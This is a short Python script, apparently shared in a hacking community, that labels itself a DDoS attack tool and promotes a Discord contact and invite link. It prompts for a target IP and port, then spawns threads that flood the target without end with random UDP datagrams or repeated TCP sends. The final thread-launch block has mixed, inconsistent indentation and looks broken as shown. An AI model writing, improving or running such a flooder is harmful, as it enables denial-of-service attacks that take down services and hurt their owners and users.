#Tools For My Team
#Tools By ZieLx
#__RΣTAX__
import random
import socket
import threading

print       (" - - > DDOS ATTACK !! DDOS ATTACK !! < - - ")
print       (" - - > DONT ABUSE THIS TOOLS !!!! < - - ")
print       (" - - > MY DISCORD? XTraylinz#0965 <- - ")                                   
print       (" - - > JIKA BUTUH BANTUAN LEBIH LANJUT BISA PM DISCORD SAYA < - - ")
print       (" - - > JOIN COMMUNITY LINK DIBAWAH < - - ")
print       (" - - > https://discord.gg/nWDNdZRtBa < - - ")
print       (" - - > BUAT YANG MAU BELAJAR LEBIH, JOIN SKUY < - - ")
    
ip = str(input("[•] IP Target : "))
port = int(input("[•] PORT Target : "))
times = int(input("[•] PACKETS Send : "))
threads = int(input("[•] THREADS Send : "))
choice = str(input("[!] Ready To Send? (y/n) : ")) 
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" RETAX COMMUNITY ATTACK!!!")
		except:
			print("[!] DOWN!!!")
def run2():
	data = random._urandom(1030)
	i = random.choice(("[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" RETAX COMMUNITY ATTACK!!!")
		except:
			print("[!] DOWN!!!")

def run3():
	data = random._urandom(16)
	i = random.choice(("[$]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" RETAX COMMUNITY ATTACK!!!")
		except:
			s.close()
			print("[*] DOWN!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	        th = threading.Thread(target = run2) 
                th.start() 
        else:
		th = threading.Thread(target = run3)
		th.start()
